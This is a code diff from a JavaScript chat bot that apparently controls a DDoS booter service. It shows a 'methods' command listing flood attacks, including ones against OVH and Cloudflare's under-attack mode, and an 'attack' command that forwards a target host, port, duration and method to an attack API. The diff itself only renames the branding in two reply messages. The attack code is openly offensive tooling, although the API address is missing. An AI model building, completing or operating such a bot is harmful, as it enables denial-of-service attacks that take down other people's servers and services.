@@ -130,7 +130,7 @@ bot.on('message', async (lol) => {
 				break
 
 			case 'methods':
-				await reply('RexonC2 Methods List\n\nLayer 4\n- OVH\n\nLayer 7\n- TLSv1\n- TLSv2\n- DCOUNT\n- CF-UAM\n- BRUTALITY')
+				await reply('C2 Methods List\n\nLayer 4\n- OVH\n\nLayer 7\n- TLSv1\n- TLSv2\n- DCOUNT\n- CF-UAM\n- BRUTALITY')
 				break
 
 			case 'attack':
@@ -142,7 +142,7 @@ bot.on('message', async (lol) => {
 				axios.get(`&host=${args[0]}&port=${args[1]}&time=${args[2]}&method=${args[3]}`)
 				axios.get(`&host=${args[0]}&port=${args[1]}&time=${args[2]}&method=${args[3]}`)
 				axios.get(`&host=${args[0]}&port=${args[1]}&time=${args[2]}&method=${args[3]}`)
-				await reply(`Succesfully Sent @rexonc2 : ${args[0]}\nTime : ${args[2]}\nMethods : ${args[3]}`)
+				await reply(`Succesfully Sent © PutraaTzyh : ${args[0]}\nTime : ${args[2]}\nMethods : ${args[3]}`)
 				break
 
 			case 'test':
